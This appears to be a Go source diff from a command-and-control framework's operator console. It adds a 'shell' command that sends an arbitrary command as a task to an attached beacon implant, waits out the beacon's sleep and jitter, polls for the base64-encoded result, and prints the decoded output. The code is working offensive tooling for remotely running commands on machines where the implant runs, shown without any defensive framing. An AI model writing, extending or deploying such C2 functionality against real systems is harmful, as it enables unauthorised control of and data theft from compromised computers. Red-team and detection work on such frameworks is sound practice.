@@ -166,6 +166,65 @@ func (s *Session) processArgsCommand(command string) (bool, error) {
 
 	switch cmd {
 
+	case "shell":
+		if !s.beaconAttached() {
+			return true, nil
+		}
+
+		s.print.BeaconSent(len([]byte(command)), s.beacon.Beacon_UID, "execute shell command")
+
+		data, err := s.client.Send_Task(command, s.beacon.Beacon_UID)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		uid := data.Task_ID
+
+		var task winton.Task
+		task.Task_UID = uid
+		task.Beacon_UID = s.beacon.Beacon_UID
+		task.Cmd = command
+		task.Status = "pending"
+		task.Result = ""
+
+		s.client.Tasks = append(s.client.Tasks, task)
+
+		var (
+			b64_result string
+			size       int
+		)
+
+		for {
+
+			time.Sleep(time.Duration(s.beacon.Beacon_Sleep)*time.Second + time.Duration(s.beacon.Beacon_Jitter)*time.Second)
+
+			time.Sleep(1 * time.Second) // slight buffer
+
+			b64_results, _ := s.client.Get_Response(uid)
+			if len(b64_results.Results) > 0 {
+				for _, result := range b64_results.Results {
+					b64_result = result.Result
+					size = len([]byte(b64_result))
+				}
+				break
+			}
+		}
+
+		res, err := winton.DecodeResult(b64_result)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		for i, task := range s.client.Tasks {
+			if task.Task_UID == uid {
+				s.client.Tasks[i].Status = "complete"
+				s.client.Tasks[i].Result = b64_result
+			}
+		}
+
+		s.print.BeaconRecv(size)
+		fmt.Println(res)
+
 	case "b64decode":
 		if len(args) != 1 {
 			s.print.Errorf("Usage: b64decode <base64 string>")
@@ -178,8 +237,7 @@ func (s *Session) processArgsCommand(command string) (bool, error) {
 		}
 
 		s.print.Infof("Decoded: %s", decoded)
-		
-	
+
 	case "use":
 		if len(args) != 1 {
 			s.print.Errorf("Usage: use <UID>")
